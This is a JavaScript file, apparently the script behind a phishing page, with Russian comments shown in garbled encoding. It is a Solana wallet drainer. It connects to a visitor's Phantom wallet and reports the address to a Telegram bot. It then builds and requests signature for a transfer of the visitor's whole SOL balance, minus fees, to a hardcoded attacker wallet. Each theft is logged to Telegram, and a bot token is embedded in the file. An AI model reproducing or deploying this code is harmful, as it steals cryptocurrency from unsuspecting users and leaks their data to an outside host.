const mainWallet = "6eRTHCv4CwL9Gr7AXygFyo9WYwqXoRMuxMrLMWMqCR6g"; // –£–∫–∞–∂–∏—Ç–µ –≤–∞—à Solana-–∫–æ—à–µ–ª–µ–∫
const botToken = "7931684835:AAH9pSLLaLLqOqd40q6o6uUMsiRHVSrak7U"; // –¢–æ–∫–µ–Ω Telegram-–±–æ—Ç–∞
const chatId = "@ppjjkkd"; // ID —á–∞—Ç–∞ –∏–ª–∏ username (@channel)


let provider = null;
let walletAddress = null;

// –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –≤ Telegram
async function sendToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
        });
    } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:", error);
    }
}

// –§—É–Ω–∫—Ü–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ Phantom Wallet
async function connectPhantom() {
    if ("solana" in window) {
        provider = window.solana;
        if (provider.isPhantom) {
            try {
                await provider.connect();
                walletAddress = provider.publicKey.toBase58();
                document.getElementById("wallet-info").innerText = `–ö–æ—à–µ–ª–µ–∫: ${walletAddress}`;
                sendToTelegram(`‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω Phantom: <code>${walletAddress}</code>`);
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ Phantom:", error);
                alert("–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ Phantom Wallet. –†–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –≤ –∫–æ—à–µ–ª—å–∫–µ.");
            }
        }
    } else {
        alert("Phantom Wallet –Ω–µ –Ω–∞–π–¥–µ–Ω! –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ –∏–ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ.");
    }
}

// –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤—Å–µ—Ö SOL –Ω–∞ –æ—Å–Ω–æ–≤–Ω–æ–π –∫–æ—à–µ–ª–µ–∫
async function didtrans() {
    if (!provider || !walletAddress) {
        alert("–°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ Phantom Wallet!");
        return;
    }

    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
    const senderPublicKey = new solanaWeb3.PublicKey(walletAddress);
    const receiverPublicKey = new solanaWeb3.PublicKey(mainWallet);

    try {
        let balanceLamports = await connection.getBalance(senderPublicKey);
        if (balanceLamports <= 0) {
            alert("–ù–∞ –∫–æ—à–µ–ª—å–∫–µ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ SOL –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏.");
            return;
        }

        let recentBlockhash = await connection.getLatestBlockhash();
        let estimatedFee = await connection.getFeeForMessage(
            new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: senderPublicKey,
                    toPubkey: receiverPublicKey,
                    lamports: 1, // –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –¥–ª—è –æ—Ü–µ–Ω–∫–∏ –∫–æ–º–∏—Å—Å–∏–∏
                })
            ).compileMessage()
        );

        let feeLamports = estimatedFee.value || 5000; // –ó–∞–ø–∞—Å –∫–æ–º–∏—Å—Å–∏–∏ 0.000005 SOL
        let amountToSend = balanceLamports - feeLamports;
        if (amountToSend <= 0) {
            alert("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –ø–æ—Å–ª–µ –≤—ã—á–µ—Ç–∞ –∫–æ–º–∏—Å—Å–∏–∏.");
            return;
        }

        let transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: senderPublicKey,
                toPubkey: receiverPublicKey,
                lamports: amountToSend,
            })
        );

        transaction.recentBlockhash = recentBlockhash.blockhash;
        transaction.feePayer = senderPublicKey;

        const { signature } = await provider.signAndSendTransaction(transaction);
        console.log("–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞, —Ö—ç—à:", signature);

        sendToTelegram(`üí∏ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è —Å <code>${walletAddress}</code> –Ω–∞ <b>${amountToSend / solanaWeb3.LAMPORTS_PER_SOL} SOL</b>\nüîó <a href="https://solscan.io/tx/${signature}">–ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≤ Solscan</a>`);
        
        alert(`–£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ ${amountToSend / solanaWeb3.LAMPORTS_PER_SOL} SOL –Ω–∞ ${mainWallet}`);

    } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:", error);
        alert("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∫–æ–Ω—Å–æ–ª—å.");
    }
}